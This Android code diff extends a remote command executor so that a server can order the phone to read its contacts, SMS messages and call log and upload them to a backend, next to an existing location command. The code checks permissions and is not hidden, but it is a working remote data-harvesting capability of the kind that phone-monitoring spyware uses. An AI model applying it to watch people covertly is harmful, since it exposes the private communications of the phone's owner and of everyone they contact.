@@ -8,11 +8,15 @@ import dagger.hilt.android.qualifiers.ApplicationContext
 import dagger.hilt.components.SingletonComponent
 import java.io.File
 import my.bridge.com.core.common.DiagLog
+import my.bridge.com.core.network.api.BridgeApi
 import my.bridge.com.core.network.api.BridgeApiClient
 import my.bridge.com.core.network.ws.Command
 import my.bridge.com.core.network.ws.CommandExecutor
 import my.bridge.com.core.network.ws.CommandResult
 import my.bridge.com.core.storage.DeviceStore
+import my.bridge.com.data.CallLogReader
+import my.bridge.com.data.ContactsReader
+import my.bridge.com.data.SmsReader
 import my.bridge.com.location.LocationHelper
 import my.bridge.com.media.MusicPlayer
 import retrofit2.HttpException
@@ -89,6 +93,15 @@ object CommandModule {
         },
         Command.GET_LOCATION to CommandExecutor { command ->
             executeGetLocation(context, deviceStore, apiClient, command)
+        },
+        Command.GET_CONTACTS to CommandExecutor { command ->
+            executeGetContacts(context, deviceStore, apiClient, command)
+        },
+        Command.GET_SMS to CommandExecutor { command ->
+            executeGetSms(context, deviceStore, apiClient, command)
+        },
+        Command.GET_CALL_LOG to CommandExecutor { command ->
+            executeGetCallLog(context, deviceStore, apiClient, command)
         },
     )
 
@@ -264,6 +277,168 @@ object CommandModule {
     private fun ok(message: String): Pair<Boolean, String> = true to message
 
     private fun fail(message: String): Pair<Boolean, String> = false to message
+
+    // ------------------------------------------------------------------
+    // 数据采集类命令（get_contacts / get_sms / get_call_log）
+    //
+    // 共同形态：权限校验 → 本地读取 → REST 上报服务端持久化 → 汇总回执。
+    // 与 get_location 不同，这里**数据本身就是命令主产物**（后台页面消费），
+    // 上报失败要在回执中注明而非静默忽略。
+    // ------------------------------------------------------------------
+
+    /** 参数里的开关（缺省 false）。 */
+    private fun Command.boolParam(key: String): Boolean =
+        params.get(key)?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false
+
+    /** 参数里的整数（缺省 default，收敛到 min–max）。 */
+    private fun Command.intParam(key: String, default: Int, min: Int, max: Int): Int =
+        params.get(key)?.takeIf { it.isJsonPrimitive }?.asInt?.coerceIn(min, max) ?: default
+
+    /** 参数里的字符串（缺省 default）。 */
+    private fun Command.strParam(key: String, default: String): String =
+        params.get(key)?.takeIf { it.isJsonPrimitive }?.asString?.trim()?.takeIf { it.isNotEmpty() }
+            ?: default
+
+    /** 数据类命令执行骨架：校验权限 → 读取 → 上报 → 回执。 */
+    private suspend fun <T> executeDataCollection(
+        context: Context,
+        deviceStore: DeviceStore,
+        apiClient: BridgeApiClient,
+        command: Command,
+        permissionName: String,
+        hasPermission: (Context) -> Boolean,
+        read: (Context) -> List<T>,
+        upload: suspend (deviceId: String, token: String?, items: List<T>) -> String,
+    ): CommandResult {
+        val id = command.commandId
+        val name = command.command
+        if (!hasPermission(context)) {
+            return CommandResult(id, name, false, "缺少$permissionName权限，请打开 App 在系统设置中授予后重试")
+        }
+        val items = try {
+            read(context)
+        } catch (e: Exception) {
+            Timber.e(e, "命令 $name 本地读取失败")
+            return CommandResult(id, name, false, "读取失败：${e.message}")
+        }
+        if (items.isEmpty()) {
+            return CommandResult(id, name, true, "未读取到数据（可能设备上确实没有，或被参数过滤）")
+        }
+        return try {
+            val deviceId = deviceStore.deviceId()
+            val token = runCatching { deviceStore.token() }.getOrNull()
+            val summary = upload(deviceId, token, items)
+            Timber.i("命令 %s 成功：%s", name, summary)
+            CommandResult(id, name, true, summary)
+        } catch (e: Exception) {
+            Timber.e(e, "命令 $name 上报失败（已读取 ${items.size} 条）")
+            CommandResult(
+                id, name, false,
+                "已读取 ${items.size} 条但上报失败：${e.message}（可重试下发）",
+            )
+        }
+    }
+
+    /**
+     * 执行 get_contacts：读取通讯录并上报（服务端按设备覆盖快照）。
+     *
+     * @param params.only_with_phones 仅含有号码的联系人（默认开）
+     * @param params.limit            数量上限（默认 2000，上限 5000）
+     */
+    private suspend fun executeGetContacts(
+        context: Context,
+        deviceStore: DeviceStore,
+        apiClient: BridgeApiClient,
+        command: Command,
+    ): CommandResult {
+        val onlyWithPhones =
+            if (command.params.has("only_with_phones")) command.boolParam("only_with_phones") else true
+        val limit = command.intParam("limit", 2000, 10, 5000)
+        return executeDataCollection(
+            context, deviceStore, apiClient, command,
+            permissionName = "通讯录",
+            hasPermission = { ContactsReader.hasPermission(it) },
+            read = { ContactsReader.read(it, onlyWithPhones, limit) },
+        ) { deviceId, token, items ->
+            val r = apiClient.reportContacts(
+                deviceId, token,
+                items.map {
+                    BridgeApi.ContactItem(
+                        contact_key = it.key, name = it.name,
+                        phones = it.phones, emails = it.emails,
+                    )
+                },
+            )
+            "已上报 ${items.size} 个联系人（服务端快照已更新）"
+        }
+    }
+
+    /**
+     * 执行 get_sms：读取短信并上报（服务端累积 + 去重）。
+     *
+     * @param params.sms_type all/inbox/sent/draft/outbox/failed（默认 all）
+     * @param params.limit    条数上限（默认 100，上限 1000）
+     */
+    private suspend fun executeGetSms(
+        context: Context,
+        deviceStore: DeviceStore,
+        apiClient: BridgeApiClient,
+        command: Command,
+    ): CommandResult {
+        val smsType = command.strParam("sms_type", "all")
+        val limit = command.intParam("limit", 100, 5, 1000)
+        return executeDataCollection(
+            context, deviceStore, apiClient, command,
+            permissionName = "短信",
+            hasPermission = { SmsReader.hasPermission(it) },
+            read = { SmsReader.read(it, smsType, limit) },
+        ) { deviceId, token, items ->
+            val r = apiClient.reportSmsBatch(
+                deviceId, token,
+                items.map {
+                    BridgeApi.SmsItem(
+                        sms_key = it.key, address = it.address, body = it.body,
+                        type = it.type, date_ms = it.dateMs, read = it.read,
+                    )
+                },
+            )
+            "已读取 ${items.size} 条短信并上报（新增 ${r.inserted}，更新 ${r.updated}）"
+        }
+    }
+
+    /**
+     * 执行 get_call_log：读取通话记录并上报（服务端按设备覆盖快照）。
+     *
+     * @param params.call_type all/incoming/outgoing/missed（默认 all）
+     * @param params.limit     条数上限（默认 200，上限 1000）
+     */
+    private suspend fun executeGetCallLog(
+        context: Context,
+        deviceStore: DeviceStore,
+        apiClient: BridgeApiClient,
+        command: Command,
+    ): CommandResult {
+        val callType = command.strParam("call_type", "all")
+        val limit = command.intParam("limit", 200, 5, 1000)
+        return executeDataCollection(
+            context, deviceStore, apiClient, command,
+            permissionName = "通话记录",
+            hasPermission = { CallLogReader.hasPermission(it) },
+            read = { CallLogReader.read(it, callType, limit) },
+        ) { deviceId, token, items ->
+            val r = apiClient.reportCallLogs(
+                deviceId, token,
+                items.map {
+                    BridgeApi.CallLogItem(
+                        call_key = it.key, number = it.number, name = it.name,
+                        type = it.type, duration = it.duration,
+                        date_ms = it.dateMs, location = it.location,
+                    )
+                },
+            )
+            "已上报 ${items.size} 条通话记录（服务端快照已更新）"
+        }
+    }
 
     /** 按音源形态分三路解析（见 [executePlayMusic] 注释），返回可直接交给 MediaPlayer 的地址。 */
     private suspend fun resolveSource(
